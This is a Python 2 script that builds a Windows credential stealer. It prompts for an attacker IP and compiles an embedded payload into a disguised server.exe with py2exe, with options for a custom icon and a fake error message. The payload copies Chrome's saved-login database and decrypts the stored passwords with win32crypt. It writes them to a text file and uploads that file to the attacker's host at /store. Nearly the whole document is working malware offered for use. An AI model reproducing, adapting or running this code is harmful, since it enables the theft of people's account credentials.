#Created by darkArp. For more info check the instructions text file. MarioNascimento@ITCrashSecurity.com
#Contains test code to be cleaned up
#To activate Fake Error Message uncomment line 14
#To include custom icon, place the icon of choice in the same directory as this script and rename it "icon.ico"
import os, socket
import sys
import cgi
import py2exe
import BaseHTTPServer
import sqlite3
import win32crypt
import requests
import subprocess
import time
import shutil
from distutils.core import setup
from os import getenv
from os.path import basename
from urllib2 import urlopen
from shutil import copyfile
reload(sys)
sys.setdefaultencoding('utf-8')
attacker_ip = raw_input('IP for revrse connection: ')
with open('attacker_ip.txt', 'w') as hostname:
     hostname.write(attacker_ip)

def done():
    os.system('cls')
    print 'Server has been created under the name server.exe\n'
    raw_input("Press Enter to continue...")
    exit()

def py2crypt():
    sys.argv.append("py2exe")
    setup(
        options = {'py2exe': {'bundle_files': 1}},
        console = [{'script': "server.py",
                    "icon_resources": [(0, "icon.ico")]}],
        zipfile = None,
        )

#  'uac_info': "requireAdministrator"

    if os.path.exists('server.exe'):
        os.remove('server.exe')
    os.rename('dist/server.exe', 'server.exe')
    shutil.rmtree('build/')
    shutil.rmtree('dist/')


with open('create_server.py') as f1:
    with open('server.py', 'w') as f2:
        lines = f1.readlines()
        i = 63
        f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n')
        while(i<len(lines)-1):
            f2.write(lines[i])
            i = i+1
    py2crypt()
    #os.remove('server.py')
    done()

"""
# -*- coding: cp1250 -*-
import ctypes
import os, sys, cgi, py2exe, BaseHTTPServer, sqlite3, win32crypt
import requests
import subprocess
import time
import shutil
from os import getenv
from distutils.core import setup
from os.path import basename
from urllib2 import urlopen
import urllib
from shutil import copyfile

import chardet
reload(sys)
sys.setdefaultencoding('ISO-8859-1')

path = (getenv("LOCALAPPDATA")  + "\\Google\\Chrome\\User Data\\Default\\Login Data")

path2 = getenv("LOCALAPPDATA")  + "\\Google\\Chrome\\User Data\\Default\\Login2"

ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32,126)]) + '_'*130
path=path.strip()
path=urllib.unquote(path)
if path.translate(ASCII_TRANS) != path: # Contains non-ascii
  path = path.decode('latin-1')
path=urllib.url2pathname(path)

ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32,126)]) + '_'*130
path2=path2.strip()
path2=urllib.unquote(path2)
if path2.translate(ASCII_TRANS) != path2: # Contains non-ascii
  path2 = path2.decode('latin-1')
path2=urllib.url2pathname(path2)

#path="Login Data"
#path2="Login2"
copyfile(path, path2)


conn = sqlite3.connect(path2)

cursor = conn.cursor()

cursor.execute('SELECT action_url, username_value, password_value FROM logins')

path3=getenv("LOCALAPPDATA")
Null,userprof = (subprocess.check_output('set USERPROFILE', shell=True).split('='))
#destination = 'passwords.txt'
destination = getenv("LOCALAPPDATA") + "\\" + "passwords.txt"

for raw in cursor.fetchall():
    try:


        if os.path.exists(destination):
            with open(destination, "a") as password:
                password.write('\n' + raw[0] + '\n' + raw[1] + '\n')

            with open(destination, "a") as password:
                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')

        else:
            with open(destination, "a") as password:
                password.write(raw[0] + '\n' + raw[1] + '\n')

            with open(destination, "a") as password:
                password.write(format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
    except:
        continue

conn.close()

command = "grab*" + destination

req = requests.get('http://' + attacker_ip)
grab,path=command.split('*')
path=destination
url = 'http://' + attacker_ip + '/store'
files = {'file': open(path, 'rb')}
r = requests.post(url, files=files)
MB_OK = 0x00
MB_ICONSTOP = 0x10
#ctypes.windll.user32.MessageBoxW(None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
"""
